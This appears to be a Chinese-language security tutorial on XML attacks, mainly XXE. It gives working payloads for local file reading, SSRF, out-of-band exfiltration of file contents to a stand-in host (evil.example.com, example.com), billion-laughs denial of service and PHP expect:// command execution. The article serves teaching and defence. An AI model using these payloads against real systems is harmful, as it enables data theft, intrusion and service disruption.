# 你所不知道的XML安全

0x00 XML简介
==========

* * *

XML 可扩展标记语言，被设计用来传输和存储数据。其形式多样

例如：

```
1.文档格式（OOXML，ODF,PDF,RSS,DOCX...）
2.图片格式（SVG,EXIF Headers,...）
3.配置文件（自定义名字，一般是.xml）
4.网络协议（WebDAV,CalDAV，XMLRPC,SOAP,REST,XMPP,SAML,XACML,...）

```

某些在XML中被设计出来的特性，比如 XML schemas（遵循XML Schemas 规范）和documents type definitions(DTDs)都是安全问题来源。纵然被公开的讨论了上十年，还是有一大批一大批的软件死在针对XML的攻击上。

其实XML实体机制很好理解，可以直接用“转义”来理解：`&#x25`和`&foo`从原始意义上来说是一样的，只是后者是由我们自己来定义任意内容。

拿DTD来说，DTD中能声明实体来定义变量（或是文字类的宏），以便在接下来的DTD或者XML文档中使用。一般实体在DTD中定义，用来访问内部资源，获取里面的文字并用来替换自己的xml文档，而外部实体用来访问外部资源（也就是说，这些资源能来自本地计算机，也可以是远程主机）。在解析外部实体的过程中，XML的分析器可能会使用众多网络协议和服务（DNS,FTP,HTTP,SMB等等）这取决于URLs里面被指定成什么。外部实体用来处理那些实时更新的文档是很有用的，然而，攻击也能在解析外部实体的过程中发生。攻击手段包括：

```
读取本地文件（可能包含敏感信息 /etc/shadow）
内存侵犯
任意代码执行
拒绝服务

```

本文将对长期以来出现的xml攻击方法进行一个总结。

0x01 初识XML外部实体攻击
================

* * *

基于外部实体的文件包含
-----------

最早被提出的XML攻击方法是利用外部实体的引用功能来实现任意文件读取

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE updateProfile [
<!ENTITY file SYSTEM "file:///c:/windows/win.ini"> ]>
<updateProfile> <firstname>Joe</firstname> <lastname>&file;</lastname> 
...
</updateProfile>

```

然而这种读取是有限制的，因为xml的解析器要求被引用的数据是完整的，我们使用一个例子来解释什么是完整。

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE simpleDocument [
<!ENTITY first "<my">
<!ENTITY second "tag/>"> ]>
<simpleDocument>&first;&second;</simpleDocument>

```

如上的xml文档当发送给服务器时，实际上是会产生一个错误的 其中`<my 和tag/>`虽然在组合在一起时是能够完美闭合的，但是这些实体由于在第3，4行就被解析一次，此时由于不是完美闭合的，就会抛出一个错误。

这种错误让xml攻击一度变得鸡肋起来，因为实际上很多文件都是“未闭合形式”的，比如在php文件推荐的写法中就是只有前面一个`"<?php"`而包含这样一个文件无疑会导致一个错误。

更糟糕的是，当你选择包含的是一个完整的xml文件(比如数据库连接文件)的时候，返回结果将是

![RHM](http://drops.javaweb.org/uploads/images/95aea78bfc5c560147f8c3ad7c60c026dbad01ba.jpg)

可以看到，在标签中的数据库配置文档被嵌入时，大部分内容都是省略号，只显示了文档的结构。这是由xml parser特性决定的。

URL Invocation
--------------

XML攻击中有一块常常被忽视，那就是利用URL机制以及他们的一些奇怪的特性来扩大攻击面。

虽然XML规范并没有要求支持任何特定的URL机制，但许多平台的底层网络库却支持了几乎所有URL机制。

借助URLs，攻击者可以让运行着XMLparser的主机向第三方主机发起恶意请求.

比如“server-side request forgery”(ssrf).理论上来说，URL Invocation甚至可以用来发起内部网络中的洪水攻击。

![RHM](http://drops.javaweb.org/uploads/images/61b8b60f6cdc4fa29dbe233a991d21034dcc49fb.jpg)

大部分人不知道的是，即使外部实体被禁用了，许多xml parsers还是会去解析那些URL。举个例子，一些parsers会在文档定义阶段对url发起请求

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag PUBLIC "-//VSR//PENTEST//EN" "http://internal/service?ssrf">
<roottag>这不是实体攻击！</roottag>

```

除了外部实体和基于DOCTYPE的SSRF攻击之外，XML Schema提供了两个在实例文档中使用的特殊属性，用于指出模式文档的位置。这两个属性是：`xsi:schemaLocation`和`xsi:noNamespaceSchemaLocation`，前者用于声明了目标名称空间的模式文档，后者用于没有目标名称空间的模式文档，它们通常在实例文档中使用。

```
<roottag xmlns="http://schema/namespace/primary"
         xmlns:secondaryns="http://schema/namespace/secondary"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://schema/namespace/primary
  <p>
    <secondaryns:s>
    ...
    </secondaryns:s>
  </p>
</roottag>
http://location/of/remote/schema/primary.xsd
http://schema/namespace/secondary
http://location/of/remote/schema/secondary.xsd">

```

在这个案例中，所有带有secondaryns:前缀的都会遵循在xmlns:secondaryns中定义的机制。由于DOCTYPE定义不能出现在文档的中部，所以当我们只对文档某个部分可控的时候，就能利用schema_Location（http://location/of/remote/schema/primary.xsd）发起ssrf。（前提是一些设置需要设置为on，然而我们并没有对每个xml parser进行充分的测试来研究不同环境下有什么要求能让我们进行ssrf攻击，所以这也是一个待研究的方向，有兴趣的wooyuner可以交流~）

0x02 引入参数实体后的攻击手段
=================

* * *

当我们的恶意xml被成功解析，这时我们有可能面临两个问题：

```
一，数据未闭合导致嵌入失败（比如只存在<?php）
二，服务器进行限制导致数据不能返回。

```

引入参数实体之后，这两个问题就能得到解决。

参数实体以%开头 我们使用参数实体只需要遵循两条原则：

参数实体只能在DTD声明中使用。 参数实体中不能再引用参数实体。

CDATA转义的妙用
----------

CDATA部件；在CDATA部件的所有内容都会被XML解析器忽略，即CDATA部件里面的内容紧紧这是一个字符串文本的作用。一个 CDATA 部件以`"<![CDATA["`标记开始，以`"]]>"`标记结束。那么我们能不能构造一个这样的页面来返回那些文件呢

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % goodies SYSTEM "file:///etc/fstab">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://evil.example.com/combine.dtd">
%dtd;
]>
<roottag>&all;</roottag>

```

combine.dtd如下

```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY all "%start;%goodies;%end;">

```

前面也提到过，当xml parsers会把xml的参数实体`% start % end`马上解释，由于没有闭合 就会抛出错误，那么这里的%start为何能正常地解析呢？ 这是因为参数实体的引用不需要在xml文档解析的时候保持xml闭合，这样就绕过了限制。

通过这样我们就能读取所有数据了（base64编码也可）

外带数据bypass回显限制
--------------

另一种使用参数实体的手段就是外带数据了。

利用参数实体，我们能够把需要读取的文件通过一些协议（http ftp等）发送到我们的服务器上，那么通过日志查看就能获取数据了 我们可以这么构造

```
<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE roottag [
<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % dtd SYSTEM "http://example.com/evil.dtd"> %dtd;]>
<roottag>&send;</roottag>

```

然后在我们可控的http://example.com/

放置如下DTD

```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://example.com/?%file;'>"> %all;

```

流程如下

![RHM](http://drops.javaweb.org/uploads/images/e3277ded0314840e1b87fc4ff533e70f95241afd.jpg)

XXE的奇门遁甲
--------

### 基于XInclude的文件包含

XInclude提供了一种较为方便的取回数据的思路（再也不用担心数据不完整而导致parser抛出一个错误）而我们能够通过parse属性，强制引用文件的类型。

```
<root xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include href="file:///etc/fstab" parse="text"/>
</root>

```

不过Xinclude需要手动开启，测试发现所有xml parser都默认关闭这一特性。

### 拒绝服务

XXE攻击也能用来发起拒绝服务攻击

如下的递归引用，从下至上以指数形式增多

```
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>

```

回忆一下解析过程，当XML处理器载入这个文档的时候，它会包含根元素，而里面定义了实体&lol9 ，而19实体扩展成了包含了`“&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;”`这个字符串。

如此递归上去，压入内存的东西呈指数增长，实验发现，一个小于1KB的XML攻击payload能消耗3GB的内存。

### 特定环境下的攻击和限制

#### Java&Xerces

默认的Oracle's Java Runtime Environment下的XML parser是Xerces，一个apache的项目。而Xerces和Java提供了一系列的特性，这些特性又能导致一些严重的安全问题。上述的那些攻击手法（DOCTYPEs for SSRF,文件读取,参数实体的外带数据）在java的默认配置下能够运用自如,java/Xerces也支持XInclude 但是需要setXIncludeAware(true) 和setNamespaceAware(true)。

java规范能够支持如下的URL机制

```
http
https
ftp
file
jar

```

令人吃惊的是Java的file协议能够用来列目录，比如说，在linux下面“file:///”会列出/目录下所有东西：

```
bin
boot
dev
etc
home
...

```

jar协议`jar:http://host/application.jar!/file/within/the/zip`会导致服务器首先取得文件然后解压这个以jar开头！结尾的包 并提取后面的文件。从攻击者的角度看，完全能够定制一些高压缩比的包（比如1000：1）这些ZIP炸弹能用来攻击反病毒系统，或者用来消耗目标机的硬盘/内存资源。注意，jar URLs能在任何接受DOCTYPE定义的JAVA Xerces系统上使用。`所以，即使外部实体关闭了，还是能够进行攻击`。

#### php&expect的RCE

很遗憾，这个扩展并不是默认安装的，然而安装了这个扩展的XXE漏洞，是能够执行任意命令。

```
<!DOCTYPE root[<!ENTITY cmd SYSTEM "expect://id">]>
<dir>
<file>&cmd;</file>
</dir>

```

那么就会返回如下

```
<file>uid=501(Apple) gid=20(staff) groups=20(staff),501(access_bpf),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),401(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),398(com.apple.access_screensharing),399(com.apple.access_ssh)<file>

```

#### xml注入

这个和xxe攻击关系并不大，但是本文讨论的是XML安全，所以这个自然也就收录进来

$GLOBALS["HTTP_RAW_POST_DATA"]在php中被设置成了“不转义”，一旦程序通过实体获取数据后，直接带入了Mysql最后造成注入

案例如下

[WooYun: PHPYUN最新版XML注入及SQL注入获取管理员账号（无视任何防御）](http://www.wooyun.org/bugs/wooyun-2014-064678)

0x03 总结
-------

* * *

XXE攻击总在被忽视

开发者往往说：

攻击威胁小..

关闭实体就能完全避免...

XML实体攻击是啥？

然而，xml实体攻击再上述的攻击中已然产生了很多出乎开发者意料的威胁。

参考文章：

VSR http://www.vsecurity.com/download/publications/XMLDTDEntityAttacks.pdf

OWASP https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing

ssrf扫描图引用自OWASP一位speaker的PDF